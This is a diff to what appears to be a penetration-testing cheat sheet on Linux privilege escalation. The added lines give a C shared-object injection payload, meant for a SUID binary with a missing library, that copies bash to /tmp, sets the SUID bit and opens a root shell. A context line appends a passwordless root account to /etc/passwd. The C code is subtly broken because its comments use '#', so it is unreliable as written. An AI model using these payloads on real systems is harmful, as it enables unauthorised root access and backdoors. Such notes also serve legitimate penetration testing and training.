@@ -717,6 +717,16 @@ echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 ### create malicious .so file and place it in the location the program expects it to be
 - identify any SUID binaries with missing .so files using a tool called strace.
 - https://rootrecipe.medium.com/suid-binaries-27c724ef753c
+```c
+#include <stdio.h>
+#include <stdlib.h>
+# GCC attribute which will be run when a shared library is loaded.
+static void inject() __attribute__((constructor));
+void inject() {
+# copies over /bin/bash and adds SUID bit to get root shell
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
 
 ### Use LinPEAS and LinEnum and Linprivchecker
 - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
